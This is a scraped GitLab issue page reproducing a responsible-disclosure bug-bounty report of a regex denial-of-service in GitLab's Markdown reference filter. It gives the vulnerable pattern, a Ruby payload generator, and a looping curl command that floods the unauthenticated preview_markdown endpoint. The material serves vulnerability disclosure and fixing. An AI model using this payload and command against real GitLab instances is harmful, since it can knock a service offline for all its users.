(?&lt;project&gt;(?-mix:(?:[a-zA-Z0-9_\.][a-zA-Z0-9_\-\.]*)(?-mix:(?&lt;!\.git|\.atom))))  </span></span>&#x000A;<span id="LC6" class="line" lang="ruby"><span class="sr">      )  </span></span>&#x000A;<span id="LC7" class="line" lang="ruby"><span class="sr">          (&gt;|&amp;gt;)  </span></span>&#x000A;<span id="LC8" class="line" lang="ruby"><span class="sr">        /x</span>  </span></code></pre>&#x000A;<copy-code></copy-code>&#x000A;</div>&#x000A;<p data-sourcepos="240:1-242:149" dir="auto">Matching this regex pattern with the payload contained in <code data-sourcepos="240:60-240:100">ProjectReferenceFilter_ReDoS_payload.json</code> causes severe backtracking.<br data-sourcepos="240:132-240:132">&#x000A;The <code data-sourcepos="241:6-241:13">(&gt;|&amp;gt;)</code> at the end of this pattern is typical of the backtracking triggers.<br data-sourcepos="241:85-241:85">&#x000A;The regex engine keeps wandering around looking for character <code data-sourcepos="242:64-242:64">&gt;</code> or string <code data-sourcepos="242:78-242:81">&amp;gt;</code> that doesn't exist in <code data-sourcepos="242:107-242:147">ProjectReferenceFilter_ReDoS_payload.json</code>.</p>&#x000A;<p data-sourcepos="244:1-244:185" dir="auto"><em data-sourcepos="244:1-244:185">NOTE: The crafted payload in <code data-sourcepos="244:32-244:72">ProjectReferenceFilter_ReDoS_payload.json</code> can be easily generated with the Ruby code <code data-sourcepos="244:119-244:182">"mailto:" + "a-" * 499_000 + "[@]aaaaaaaa..aaaaaaaa.example.com"</code>.</em></p>&#x000A;<h4 data-sourcepos="246:1-246:44" dir="auto">&#x000A;<a id="user-content-what-is-the-expected-correct-behavior" class="anchor" href="#what-is-the-expected-correct-behavior" aria-hidden="true"></a>What is the expected correct behavior?</h4>&#x000A;<p data-sourcepos="248:1-250:138" dir="auto">A typical technique for fixing the ReDoS is to rewrite the code without using regex matching.<br data-sourcepos="248:96-248:96">&#x000A;However, in this case, rewriting the code to not use regex matching could break consistency with other features.<br data-sourcepos="249:115-249:115">&#x000A;So, if we also care about consistency with other features, we need to rewrite the regex pattern <code data-sourcepos="250:98-250:105">(&gt;|&amp;gt;)</code> nicely to prevent backtracking.</p>&#x000A;<h4 data-sourcepos="252:1-252:40" dir="auto">&#x000A;<a id="user-content-relevant-logs-andor-screenshots" class="anchor" href="#relevant-logs-andor-screenshots" aria-hidden="true"></a>Relevant logs and/or screenshots</h4>&#x000A;<p data-sourcepos="253:1-254:90" dir="auto">I put references to the screenshots at the appropriate places in this report.<br data-sourcepos="253:80-253:80">&#x000A;I also attach the stack trace when one request was forcefully stopped after 60+ seconds.</p>&#x000A;<div class="gl-relative markdown-code-block js-markdown-code">&#x000A;<pre data-sourcepos="255:1-318:3" class="code highlight js-syntax-highlight language-plaintext" lang="plaintext" v-pre="true"><code><span id="LC1" class="line" lang="plaintext">Rack::Timeout::RequestTimeoutException (Request ran for longer than 60000ms ):  </span>&#x000A;<span id="LC2" class="line" lang="plaintext">    </span>&#x000A;<span id="LC3" class="line" lang="plaintext">lib/banzai/filter/references/reference_filter.rb:209:in `replace_text_when_pattern_matches'  </span>&#x000A;<span id="LC4" class="line" lang="plaintext">lib/banzai/filter/references/reference_filter.rb:50:in `block in call'  </span>&#x000A;<span id="LC5" class="line" lang="plaintext">lib/banzai/filter/references/reference_filter.rb:48:in `each'  </span>&#x000A;<span id="LC6" class="line" lang="plaintext">lib/banzai/filter/references/reference_filter.rb:48:in `each_with_index'  </span>&#x000A;<span id="LC7" class="line" lang="plaintext">lib/banzai/filter/references/reference_filter.rb:48:in `call'  </span>&#x000A;<span id="LC8" class="line" lang="plaintext">lib/banzai/filter/references/reference_filter.rb:42:in `block in call_and_update_nodes'  </span>&#x000A;<span id="LC9" class="line" lang="plaintext">lib/banzai/filter/references/reference_filter.rb:291:in `with_update_nodes'  </span>&#x000A;<span id="LC10" class="line" lang="plaintext">lib/banzai/filter/references/reference_filter.rb:42:in `call_and_update_nodes'  </span>&#x000A;<span id="LC11" class="line" lang="plaintext">lib/banzai/filter/references/reference_filter.rb:30:in `call'  </span>&#x000A;<span id="LC12" class="line" lang="plaintext">lib/banzai/pipeline/base_pipeline.rb:23:in `block (2 levels) in singleton class'  </span>&#x000A;<span id="LC13" class="line" lang="plaintext">lib/banzai/renderer.rb:130:in `render_result'  </span>&#x000A;<span id="LC14" class="line" lang="plaintext">lib/banzai/renderer.rb:166:in `cacheless_render'  </span>&#x000A;<span id="LC15" class="line" lang="plaintext">lib/banzai/renderer.rb:30:in `render'  </span>&#x000A;<span id="LC16" class="line" lang="plaintext">lib/banzai/renderer.rb:120:in `block in cache_collection_render'  </span>&#x000A;<span id="LC17" class="line" lang="plaintext">lib/banzai/renderer.rb:119:in `each'  </span>&#x000A;<span id="LC18" class="line" lang="plaintext">lib/banzai/renderer.rb:119:in `cache_collection_render'  </span>&#x000A;<span id="LC19" class="line" lang="plaintext">lib/banzai/reference_extractor.rb:33:in `html_documents'  </span>&#x000A;<span id="LC20" class="line" lang="plaintext">lib/banzai/reference_extractor.rb:18:in `references'  </span>&#x000A;<span id="LC21" class="line" lang="plaintext">lib/gitlab/reference_extractor.rb:24:in `references'  </span>&#x000A;<span id="LC22" class="line" lang="plaintext">lib/gitlab/reference_extractor.rb:43:in `block (2 levels) in &lt;class:ReferenceExtractor&gt;'  </span>&#x000A;<span id="LC23" class="line" lang="plaintext">app/services/preview_markdown_service.rb:33:in `find_user_references'  </span>&#x000A;<span id="LC24" class="line" lang="plaintext">app/services/preview_markdown_service.rb:6:in `execute'  </span>&#x000A;<span id="LC25" class="line" lang="plaintext">app/controllers/concerns/preview_markdown.rb:8:in `preview_markdown'  </span>&#x000A;<span id="LC26" class="line" lang="plaintext">ee/lib/gitlab/ip_address_state.rb:10:in `with'  </span>&#x000A;<span id="LC27" class="line" lang="plaintext">ee/app/controllers/ee/application_controller.rb:45:in `set_current_ip_address'  </span>&#x000A;<span id="LC28" class="line" lang="plaintext">app/controllers/application_controller.rb:524:in `set_current_admin'  </span>&#x000A;<span id="LC29" class="line" lang="plaintext">lib/gitlab/session.rb:11:in `with_session'  </span>&#x000A;<span id="LC30" class="line" lang="plaintext">app/controllers/application_controller.rb:515:in `set_session_storage'  </span>&#x000A;<span id="LC31" class="line" lang="plaintext">lib/gitlab/i18n.rb:107:in `with_locale'  </span>&#x000A;<span id="LC32" class="line" lang="plaintext">app/controllers/application_controller.rb:508:in `set_locale'  </span>&#x000A;<span id="LC33" class="line" lang="plaintext">app/controllers/application_controller.rb:499:in `set_current_context'  </span>&#x000A;<span id="LC34" class="line" lang="plaintext">lib/gitlab/metrics/elasticsearch_rack_middleware.rb:16:in `call'  </span>&#x000A;<span id="LC35" class="line" lang="plaintext">lib/gitlab/middleware/memory_report.rb:13:in `call'  </span>&#x000A;<span id="LC36" class="line" lang="plaintext">lib/gitlab/middleware/speedscope.rb:13:in `call'  </span>&#x000A;<span id="LC37" class="line" lang="plaintext">lib/gitlab/database/load_balancing/rack_middleware.rb:23:in `call'  </span>&#x000A;<span id="LC38" class="line" lang="plaintext">lib/gitlab/middleware/rails_queue_duration.rb:33:in `call'  </span>&#x000A;<span id="LC39" class="line" lang="plaintext">lib/gitlab/metrics/rack_middleware.rb:16:in `block in call'  </span>&#x000A;<span id="LC40" class="line" lang="plaintext">lib/gitlab/metrics/web_transaction.rb:46:in `run'  </span>&#x000A;<span id="LC41" class="line" lang="plaintext">lib/gitlab/metrics/rack_middleware.rb:16:in `call'  </span>&#x000A;<span id="LC42" class="line" lang="plaintext">lib/gitlab/jira/middleware.rb:19:in `call'  </span>&#x000A;<span id="LC43" class="line" lang="plaintext">lib/gitlab/middleware/go.rb:20:in `call'  </span>&#x000A;<span id="LC44" class="line" lang="plaintext">lib/gitlab/etag_caching/middleware.rb:21:in `call'  </span>&#x000A;<span id="LC45" class="line" lang="plaintext">lib/gitlab/middleware/query_analyzer.rb:11:in `block in call'  </span>&#x000A;<span id="LC46" class="line" lang="plaintext">lib/gitlab/database/query_analyzer.rb:37:in `within'  </span>&#x000A;<span id="LC47" class="line" lang="plaintext">lib/gitlab/middleware/query_analyzer.rb:11:in `call'  </span>&#x000A;<span id="LC48" class="line" lang="plaintext">lib/gitlab/middleware/multipart.rb:173:in `call'  </span>&#x000A;<span id="LC49" class="line" lang="plaintext">lib/gitlab/middleware/read_only/controller.rb:50:in `call'  </span>&#x000A;<span id="LC50" class="line" lang="plaintext">lib/gitlab/middleware/read_only.rb:18:in `call'  </span>&#x000A;<span id="LC51" class="line" lang="plaintext">lib/gitlab/middleware/same_site_cookies.rb:27:in `call'  </span>&#x000A;<span id="LC52" class="line" lang="plaintext">lib/gitlab/middleware/basic_health_check.rb:25:in `call'  </span>&#x000A;<span id="LC53" class="line" lang="plaintext">lib/gitlab/middleware/handle_malformed_strings.rb:21:in `call'  </span>&#x000A;<span id="LC54" class="line" lang="plaintext">lib/gitlab/middleware/handle_ip_spoof_attack_error.rb:25:in `call'  </span>&#x000A;<span id="LC55" class="line" lang="plaintext">lib/gitlab/middleware/request_context.rb:21:in `call'  </span>&#x000A;<span id="LC56" class="line" lang="plaintext">lib/gitlab/middleware/webhook_recursion_detection.rb:15:in `call'  </span>&#x000A;<span id="LC57" class="line" lang="plaintext">config/initializers/fix_local_cache_middleware.rb:11:in `call'  </span>&#x000A;<span id="LC58" class="line" lang="plaintext">lib/gitlab/middleware/compressed_json.rb:37:in `call'  </span>&#x000A;<span id="LC59" class="line" lang="plaintext">lib/gitlab/middleware/rack_multipart_tempfile_factory.rb:19:in `call'  </span>&#x000A;<span id="LC60" class="line" lang="plaintext">lib/gitlab/middleware/sidekiq_web_static.rb:20:in `call'  </span>&#x000A;<span id="LC61" class="line" lang="plaintext">lib/gitlab/metrics/requests_rack_middleware.rb:79:in `call'  </span>&#x000A;<span id="LC62" class="line" lang="plaintext">lib/gitlab/middleware/release_env.rb:13:in `call'  </span></code></pre>&#x000A;<copy-code></copy-code>&#x000A;</div>&#x000A;<h4 data-sourcepos="320:1-320:24" dir="auto">&#x000A;<a id="user-content-output-of-checks" class="anchor" href="#output-of-checks" aria-hidden="true"></a>Output of checks</h4>&#x000A;<p data-sourcepos="321:1-322:72" dir="auto">This bug happens on the official Docker installation of GitLab Enterprise Edition <code data-sourcepos="321:84-321:93">15.11.0-ee</code>.<br data-sourcepos="321:98-321:98">&#x000A;I used <code data-sourcepos="322:9-322:20">Chromium 112</code> and <code data-sourcepos="322:28-322:38">Firefox 112</code> on Debian 11 to verify this bug.</p>&#x000A;<h6 data-sourcepos="324:1-324:44" dir="auto">&#x000A;<a id="user-content-results-of-gitlab-environment-info" class="anchor" href="#results-of-gitlab-environment-info" aria-hidden="true"></a>Results of GitLab environment info</h6>&#x000A;<p data-sourcepos="325:1-325:47" dir="auto">Output of <code data-sourcepos="325:12-325:43">sudo gitlab-rake gitlab:env:info</code>:</p>&#x000A;<div class="gl-relative markdown-code-block js-markdown-code">&#x000A;<pre data-sourcepos="326:1-360:3" class="code highlight js-syntax-highlight language-plaintext" lang="plaintext" v-pre="true"><code><span id="LC1" class="line" lang="plaintext">System information  </span>&#x000A;<span id="LC2" class="line" lang="plaintext">System:		  </span>&#x000A;<span id="LC3" class="line" lang="plaintext">Proxy:		no  </span>&#x000A;<span id="LC4" class="line" lang="plaintext">Current User:	git  </span>&#x000A;<span id="LC5" class="line" lang="plaintext">Using RVM:	no  </span>&#x000A;<span id="LC6" class="line" lang="plaintext">Ruby Version:	3.0.6p216  </span>&#x000A;<span id="LC7" class="line" lang="plaintext">Gem Version:	3.2.33  </span>&#x000A;<span id="LC8" class="line" lang="plaintext">Bundler Version:2.3.15  </span>&#x000A;<span id="LC9" class="line" lang="plaintext">Rake Version:	13.0.6  </span>&#x000A;<span id="LC10" class="line" lang="plaintext">Redis Version:	6.2.11  </span>&#x000A;<span id="LC11" class="line" lang="plaintext">Sidekiq Version:6.5.7  </span>&#x000A;<span id="LC12" class="line" lang="plaintext">Go Version:	unknown</span>&#x000A;<span id="LC13" class="line" lang="plaintext"></span>&#x000A;<span id="LC14" class="line" lang="plaintext">GitLab information  </span>&#x000A;<span id="LC15" class="line" lang="plaintext">Version:	15.11.0-ee  </span>&#x000A;<span id="LC16" class="line" lang="plaintext">Revision:	4dce6bc3728  </span>&#x000A;<span id="LC17" class="line" lang="plaintext">Directory:	/opt/gitlab/embedded/service/gitlab-rails  </span>&#x000A;<span id="LC18" class="line" lang="plaintext">DB Adapter:	PostgreSQL  </span>&#x000A;<span id="LC19" class="line" lang="plaintext">DB Version:	13.8  </span>&#x000A;<span id="LC20" class="line" lang="plaintext">URL:		http://my-gitlab-h1.test  </span>&#x000A;<span id="LC21" class="line" lang="plaintext">HTTP Clone URL:	http://my-gitlab-h1.test/some-group/some-project.git  </span>&#x000A;<span id="LC22" class="line" lang="plaintext">SSH Clone URL:	git@my-gitlab-h1.test:some-group/some-project.git  </span>&#x000A;<span id="LC23" class="line" lang="plaintext">Elasticsearch:	no  </span>&#x000A;<span id="LC24" class="line" lang="plaintext">Geo:		no  </span>&#x000A;<span id="LC25" class="line" lang="plaintext">Using LDAP:	no  </span>&#x000A;<span id="LC26" class="line" lang="plaintext">Using Omniauth:	yes  </span>&#x000A;<span id="LC27" class="line" lang="plaintext">Omniauth Providers: </span>&#x000A;<span id="LC28" class="line" lang="plaintext"></span>&#x000A;<span id="LC29" class="line" lang="plaintext">GitLab Shell  </span>&#x000A;<span id="LC30" class="line" lang="plaintext">Version:	14.18.0  </span>&#x000A;<span id="LC31" class="line" lang="plaintext">Repository storages:  </span>&#x000A;<span id="LC32" class="line" lang="plaintext">- default: 	unix:/var/opt/gitlab/gitaly/gitaly.socket  </span>&#x000A;<span id="LC33" class="line" lang="plaintext">GitLab Shell path:		/opt/gitlab/embedded/service/gitlab-shell  </span></code></pre>&#x000A;<copy-code></copy-code>&#x000A;</div>&#x000A;<h4 data-sourcepos="362:1-362:12" dir="auto">&#x000A;<a id="user-content-impact" class="anchor" href="#impact" aria-hidden="true"></a>Impact</h4>&#x000A;<p data-sourcepos="364:1-365:201" dir="auto">By exploiting this ReDoS vulnerability, an unauthenticated attacker could significantly reduce the availability of the entire the GitLab instance.<br data-sourcepos="364:149-364:149">&#x000A;Based on <a data-sourcepos="365:10-365:99" href="https://hackerone.com/gitlab?view_policy=true" rel="nofollow noreferrer noopener" target="_blank">the policy of GitLab's Bug Bounty Program</a>, past reports, and my research on the impact of this bug, I would suggest the following CVSS score:</p>&#x000A;<div class="gl-relative markdown-code-block js-markdown-code">&#x000A;<pre data-sourcepos="366:1-369:5" class="code highlight js-syntax-highlight language-plaintext" lang="plaintext" v-pre="true"><code><span id="LC1" class="line" lang="plaintext">CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H  </span>&#x000A;<span id="LC2" class="line" lang="plaintext">7.5 (High)  </span></code></pre>&#x000A;<copy-code></copy-code>&#x000A;</div>&#x000A;<p data-sourcepos="370:1-370:93" dir="auto">I would also like to add some detailed explanations of the notable points in the above score.</p>&#x000A;<ul data-sourcepos="372:1-375:183" dir="auto">&#x000A;<li data-sourcepos="372:1-373:0">&#x000A;<p data-sourcepos="372:3-372:121"><code data-sourcepos="372:4-372:7">PR:N</code> : As described in the "Steps to reproduce" section, this attack can be performed by an unauthenticated attacker.</p>&#x000A;</li>&#x000A;<li data-sourcepos="374:1-375:183">&#x000A;<p data-sourcepos="374:3-375:183"><code data-sourcepos="374:4-374:6">A:H</code> : This ReDoS attack causes enough load to meet the <code data-sourcepos="374:61-374:63">A:H</code> criteria for the <a data-sourcepos="374:83-374:190" href="https://docs.gitlab.com/ee/administration/reference_architectures/1k_users.html" rel="nofollow noreferrer noopener" target="_blank">1k Reference Architecture</a> as stated in <a data-sourcepos="374:205-374:299" href="https://gitlab-com.gitlab.io/gl-security/appsec/cvss-calculator/" rel="nofollow noreferrer noopener" target="_blank">GitLab CVSS Calculator page</a>.<br data-sourcepos="374:303-374:303">&#x000A;More specifically, this attack clearly satisfies the "Clarifying notes" condition in <a data-sourcepos="375:88-375:182" href="https://gitlab-com.gitlab.io/gl-security/appsec/cvss-calculator/" rel="nofollow noreferrer noopener" target="_blank">GitLab CVSS Calculator page</a>.</p>&#x000A;</li>&#x000A;</ul>&#x000A;<blockquote data-sourcepos="376:1-376:361" dir="auto">&#x000A;<p data-sourcepos="376:3-376:361">When evaluating Availability impacts for DoS that require sustained traffic, use the <a data-sourcepos="376:88-376:195" href="https://docs.gitlab.com/ee/administration/reference_architectures/1k_users.html" rel="nofollow noreferrer noopener" target="_blank">1k Reference Architecture</a>. The number of requests must be fewer than the "test request per seconds rates" and cause 10+ seconds of user-perceivable unavailability to rate the impact as <code data-sourcepos="376:357-376:359">A:H</code>.</p>&#x000A;</blockquote>&#x000A;<p data-sourcepos="378:1-378:123" dir="auto">In addition to the above, it is important to note that any feature with Markdown fields is vulnerable to this ReDoS attack.</p>&#x000A;<h2 data-sourcepos="380:1-380:14" dir="auto">&#x000A;<a id="user-content-attachments" class="anchor" href="#attachments" aria-hidden="true"></a>Attachments</h2>&#x000A;<p data-sourcepos="382:1-382:77" dir="auto"><strong data-sourcepos="382:1-382:12">Warning:</strong> Attachments received through HackerOne, please exercise caution!</p>&#x000A;<ul data-sourcepos="384:1-393:0" dir="auto">&#x000A;<li data-sourcepos="384:1-384:153"><a data-sourcepos="384:3-384:153" href="https://h1.sec.gitlab.net/a/1892d7aa-a873-45b2-ab68-9926e8fa5cb2/ProjectReferenceFilter_ReDoS_payload.json" rel="nofollow noreferrer noopener" target="_blank">ProjectReferenceFilter_ReDoS_payload.json</a></li>&#x000A;<li data-sourcepos="385:1-385:133"><a data-sourcepos="385:3-385:133" href="https://h1.sec.gitlab.net/a/4c693521-3a6e-41ba-b135-ef39e65ec5a9/create_public_group_updated.png" rel="nofollow noreferrer noopener" target="_blank">create_public_group_updated.png</a></li>&#x000A;<li data-sourcepos="386:1-386:99"><a data-sourcepos="386:3-386:99" href="https://h1.sec.gitlab.net/a/7778001e-852a-4a7d-a001-2baa73c1c8ae/csrf_token.png" rel="nofollow noreferrer noopener" target="_blank">csrf_token.png</a></li>&#x000A;<li data-sourcepos="387:1-387:105"><a data-sourcepos="387:3-387:105" href="https://h1.sec.gitlab.net/a/278850fd-8f02-4d19-ad67-e6103e6c387f/session_value.png" rel="nofollow noreferrer noopener" target="_blank">session_value.png</a></li>&#x000A;<li data-sourcepos="388:1-388:127"><a data-sourcepos="388:3-388:127" href="https://h1.sec.gitlab.net/a/305622a4-93e6-4b27-805b-c107b062fd24/htop_all_cores_exhausted.png" rel="nofollow noreferrer noopener" target="_blank">htop_all_cores_exhausted.png</a></li>&#x000A;<li data-sourcepos="389:1-389:107"><a data-sourcepos="389:3-389:107" href="https://h1.sec.gitlab.net/a/acb8765c-7445-4cc2-9ca6-edee69bc43f2/response_delay.png" rel="nofollow noreferrer noopener" target="_blank">response_delay.png</a></li>&#x000A;<li data-sourcepos="390:1-390:97"><a data-sourcepos="390:3-390:97" href="https://h1.sec.gitlab.net/a/a8441076-2fe5-4964-9973-3ba7b350dc3d/500_error.png" rel="nofollow noreferrer noopener" target="_blank">500_error.png</a></li>&#x000A;<li data-sourcepos="391:1-391:109"><a data-sourcepos="391:3-391:109" href="https://h1.sec.gitlab.net/a/bfdf438e-70dc-497f-8c6e-3507359a7bec/failed_pipeline.png" rel="nofollow noreferrer noopener" target="_blank">failed_pipeline.png</a></li>&#x000A;<li data-sourcepos="392:1-393:0"><a data-sourcepos="392:3-392:117" href="https://h1.sec.gitlab.net/a/0cf7e9ec-1b7c-45be-9ae4-077ec8d13ebc/failed_jobs_timeout.png" rel="nofollow noreferrer noopener" target="_blank">failed_jobs_timeout.png</a></li>&#x000A;</ul>&#x000A;<h2 data-sourcepos="394:1-394:19" dir="auto">&#x000A;<a id="user-content-how-to-reproduce" class="anchor" href="#how-to-reproduce" aria-hidden="true"></a>How To Reproduce</h2>&#x000A;<p data-sourcepos="396:1-396:57" dir="auto">Please add <a data-sourcepos="396:12-396:40" href="https://about.gitlab.com/handbook/engineering/security/#reproducibility-on-security-issues" rel="nofollow noreferrer noopener" target="_blank">reproducibility information</a> to this section:</p>&#x000A;<ol data-sourcepos="398:1-401:0" dir="auto">&#x000A;<li data-sourcepos="398:1-398:2">&#x000A;</li>&#x000A;<li data-sourcepos="399:1-399:2">&#x000A;</li>&#x000A;<li data-sourcepos="400:1-400:2">&#x000A;</li>&#x000A;</ol></div>
</div>

</div>
<div class="js-issue-widgets">
<div class="emoji-block emoji-block-sticky">
<div class="row gl-m-0 gl-justify-between">
<div class="js-noteable-awards">
<div class="gl-flex gl-flex-wrap gl-justify-between gl-pt-3">
<div data-can-award-emoji="false" data-path="/api/v4/projects/278964/issues/416225/award_emoji" data-show-default-award-emojis="true" id="js-vue-awards-block"></div>

</div>

</div>
<div class="new-branch-col gl-font-size-0 gl-my-2">

</div>
</div>
</div>

</div>
</div>
<div class="js-issue-widgets">

<div class="js-design-management" data-issue-iid="416225" data-issue-path="/gitlab-org/gitlab/-/issues/416225" data-new-comment-template-paths="[{&quot;text&quot;:&quot;Your comment templates&quot;,&quot;href&quot;:&quot;/-/profile/comment_templates&quot;}]" data-project-path="gitlab-org/gitlab" data-register-path="/users/sign_up?redirect_to_referer=yes" data-sign-in-path="/users/sign_in?redirect_to_referer=yes"></div>

<div class="js-work-item-links-root" data-full-path="gitlab-org/gitlab" data-issuable-id="129825140" data-issuable-iid="416225" data-register-path="/users/sign_up?redirect_to_referer=yes" data-sign-in-path="/users/sign_in?redirect_to_referer=yes" data-wi-autocomplete-award-emojis-path="/-/autocomplete/award_emojis" data-wi-can-admin-label="false" data-wi-can-bulk-edit-epics="false" data-wi-can-create-projects="false" data-wi-default-branch="master" data-wi-epics-list-path="/groups/gitlab/-/epics" data-wi-full-path="gitlab-org/gitlab" data-wi-group-id="9970" data-wi-group-issues-path="/groups/gitlab/-/issues" data-wi-group-path="gitlab-org" data-wi-has-epics-feature="true" data-wi-has-issuable-health-status-feature="true" data-wi-has-issue-weights-feature="true" data-wi-has-iterations-feature="true" data-wi-has-linked-items-epics-feature="true" data-wi-has-okrs-feature="true" data-wi-has-quality-management-feature="true" data-wi-has-scoped-labels-feature="true" data-wi-has-subepics-feature="true" data-wi-is-signed-in="false" data-wi-issues-list-path="/gitlab-org/gitlab/-/issues" data-wi-labels-fetch-path="/groups/gitlab/-/labels.json?include_ancestor_groups=true&amp;only_group_labels=true" data-wi-labels-manage-path="/gitlab-org/gitlab/-/labels" data-wi-new-comment-template-paths="[{&quot;text&quot;:&quot;Your comment templates&quot;,&quot;href&quot;:&quot;/-/profile/comment_templates&quot;}]" data-wi-new-project-path="/projects/new?namespace_id=9970" data-wi-register-path="/users/sign_up?redirect_to_referer=yes" data-wi-report-abuse-path="/-/abuse_reports/add_category" data-wi-show-new-issue-link="false" data-wi-sign-in-path="/users/sign_in?redirect_to_referer=yes"></div>


<div class="js-related-issues-root" data-can-add-related-issues="false" data-endpoint="/gitlab-org/gitlab/-/issues/416225/links" data-full-path="gitlab-org/gitlab" data-has-issue-weights-feature="true" data-has-iterations-feature="true" data-help-path="/help/user/project/issues/related_issues.md" data-is-group="false" data-issuable-type="issue" data-show-categorized-issues="true" data-wi-autocomplete-award-emojis-path="/-/autocomplete/award_emojis" data-wi-can-admin-label="false" data-wi-can-bulk-edit-epics="false" data-wi-can-create-projects="false" data-wi-default-branch="master" data-wi-epics-list-path="/groups/gitlab/-/epics" data-wi-full-path="gitlab-org/gitlab" data-wi-group-id="9970" data-wi-group-issues-path="/groups/gitlab/-/issues" data-wi-group-path="gitlab-org" data-wi-has-epics-feature="true" data-wi-has-issuable-health-status-feature="true" data-wi-has-issue-weights-feature="true" data-wi-has-iterations-feature="true" data-wi-has-linked-items-epics-feature="true" data-wi-has-okrs-feature="true" data-wi-has-quality-management-feature="true" data-wi-has-scoped-labels-feature="true" data-wi-has-subepics-feature="true" data-wi-is-signed-in="false" data-wi-issues-list-path="/gitlab-org/gitlab/-/issues" data-wi-labels-fetch-path="/groups/gitlab/-/labels.json?include_ancestor_groups=true&amp;only_group_labels=true" data-wi-labels-manage-path="/gitlab-org/gitlab/-/labels" data-wi-new-comment-template-paths="[{&quot;text&quot;:&quot;Your comment templates&quot;,&quot;href&quot;:&quot;/-/profile/comment_templates&quot;}]" data-wi-new-project-path="/projects/new?namespace_id=9970" data-wi-register-path="/users/sign_up?redirect_to_referer=yes" data-wi-report-abuse-path="/-/abuse_reports/add_category" data-wi-show-new-issue-link="false" data-wi-sign-in-path="/users/sign_in?redirect_to_referer=yes"></div>

<div data-has-closing-merge-request="false" data-iid="416225" data-project-path="gitlab-org/gitlab" id="js-related-merge-requests"></div>
<div data-url="/gitlab-org/gitlab/-/issues/416225/related_branches" id="related-branches">
</div>
</div>
<div class="js-issue-widgets">
<section class="issuable-discussion js-vue-notes-event">
<div data-can-add-timeline-events="false" data-current-user-data="null" data-new-comment-template-paths="[{&quot;text&quot;:&quot;Your comment templates&quot;,&quot;href&quot;:&quot;/-/profile/comment_templates&quot;}]" data-noteable-data="{&quot;id&quot;:129825140,&quot;iid&quot;:416225,&quot;description&quot;:&quot;:warning: **Please read [the process](https://gitlab.com/gitlab-org/release/docs/-/blob/master/general/security/developer.md) on how to fix security issues before starting to work on the issue. Vulnerabilities must be fixed in a security mirror.**\n\n**[HackerOne report #1963255](https://hackerone.com/reports/1963255)** by `ryhmnlfj` on 2023-04-27:\n\n[Report](#report) | [Attachments](#attachments) | [How To Reproduce](#how-to-reproduce)\n\n## Report\n\n####  Summary\n\nI found the server-side ReDoS via `ProjectReferenceFilter` in any Markdown fields.  \nAn attacker can take down the GitLab instance by sending the **unauthenticated requests** which contain the crafted payload to the `preview_markdown` endpoint.\n\n####  Preparation before reproducing the bug\n\nPlease install the command line tools `ruby` and `curl` on your computer.  \nAlso, please download `ProjectReferenceFilter_ReDoS_payload.json` attached to this report.  \nThese will be used in step 11 of the \&quot;Steps to reproduce\&quot; section.\n\nAnd most importantly, please prepare a GitLab instance that you can use personally.  \n**DO NOT try to reproduce this bug against `gitlab.com` or other public instances.**\n\n####  Steps to reproduce\n\n1. Set up and launch your GitLab instance, and create a new account on it.  \n2. Sign in to the account you created in step 1.  \n3. Create a new **public group** and make a note of **the public group name** at this time.  \n   At the same time, make a note of **the base URL with scheme** shown in \&quot;Group URL\&quot;.\n\n![create_public_group_updated.png](https://h1.sec.gitlab.net/a/4c693521-3a6e-41ba-b135-ef39e65ec5a9/create_public_group_updated.png)\n\n4. Sign out as you will be accessing as an unauthenticated user in the following steps.  \n5. After launching your browser&#39;s developer tools, browse to the **public group** you created in step 3 as an unauthenticated user.  \n6. Check the HTML rendered in step 5 and take a note of the content of `csrf-token` at this time.\n\n![csrf_token.png](https://h1.sec.gitlab.net/a/7778001e-852a-4a7d-a001-2baa73c1c8ae/csrf_token.png)\n\n7. Check the request sent to your GitLab instance in step 5 and take a note the value of `_gitlab_session` at this time.\n\n![session_value.png](https://h1.sec.gitlab.net/a/278850fd-8f02-4d19-ad67-e6103e6c387f/session_value.png)\n\n8. Close your browser and open a command console.  \n9. Let&#39;s construct the command to demonstrate the ReDoS. Replace each string in the command template according to the replacement table.\n\n* Command template:  \n```  \nruby -e &#39;while true do p spawn(\&quot;curl --header Content-Type:application/json --header X-CSRF-Token:[CSRF_TOKEN_VALUE] --header Cookie:_gitlab_session=[SESSION_VALUE] --data [@]ProjectReferenceFilter_ReDoS_payload.json [BASE_URL_WITH_SCHEME]groups/[PUBLIC_GROUP_NAME]/preview_markdown\&quot;); sleep 1; end&#39;  \n```  \n* Replacement table:\n\n| String in the command template  | Replace with                                   |  \n|---------------------------------|------------------------------------------------|  \n| `[CSRF_TOKEN_VALUE]`            | the content of `csrf-token` noted in step 6    |  \n| `[SESSION_VALUE]`               | the value of `_gitlab_session` noted in step 7 |  \n| `[BASE_URL_WITH_SCHEME]`        | **the base URL with scheme** noted in step 3   |  \n| `[PUBLIC_GROUP_NAME]`           | **the public group name** noted in step 3      |\n\nFor reference, here&#39;s an example in my local environment:  \n```  \nruby -e &#39;while true do p spawn(\&quot;curl --header Content-Type:application/json --header X-CSRF-Token:E_NhtPEqA7IpGGSH0jgsfRtruz5fAeeqRxQgBn-kl2mCkdxxBHP4HC9YdK6_mDdZqxCkhzkjSzESZOvAGwJQPQ --header Cookie:_gitlab_session=26c454aeadefc013a10a0fdddabcfd12 --data [@]ProjectReferenceFilter_ReDoS_payload.json http://my-gitlab-h1.test/groups/public_group_for_test/preview_markdown\&quot;); sleep 1; end&#39;  \n```\n\n10. Change the current directory of the command console to the directory where `ProjectReferenceFilter_ReDoS_payload.json` is saved.  \n11. Run the command constructed in step 9 in the command console, and confirm the significant consumption of CPU resource.  \nFor reference, when I ran the above command, the CPU resource of my instance with 16 CPU cores and 32GB of memory was quickly exhausted.\n\n![htop_all_cores_exhausted.png](https://h1.sec.gitlab.net/a/305622a4-93e6-4b27-805b-c107b062fd24/htop_all_cores_exhausted.png)\n\nIn an instance with performance close to the [1k Reference Architecture (with 8 CPU cores, 7.2GB memory)](https://docs.gitlab.com/ee/administration/reference_architectures/1k_users.html), this CPU resource consumption causes noticeable performance degradation in tens of seconds, and visibly delays response to all other users.\n\n![response_delay.png](https://h1.sec.gitlab.net/a/acb8765c-7445-4cc2-9ca6-edee69bc43f2/response_delay.png)\n\nUnless the crafted command is interrupted, this performance degradation will continue and get worse until the instance becomes completely unresponsive.\n\n_NOTE: If you can confirm a surge in CPU usage at step 11, that&#39;s enough confirmation that this bug is a valid ReDoS vulnerability, based on past valid reports._\n\n_NOTE 2: This crafted command will keep sending requests until you force it to stop. Please be sure to terminate the command after confirming the 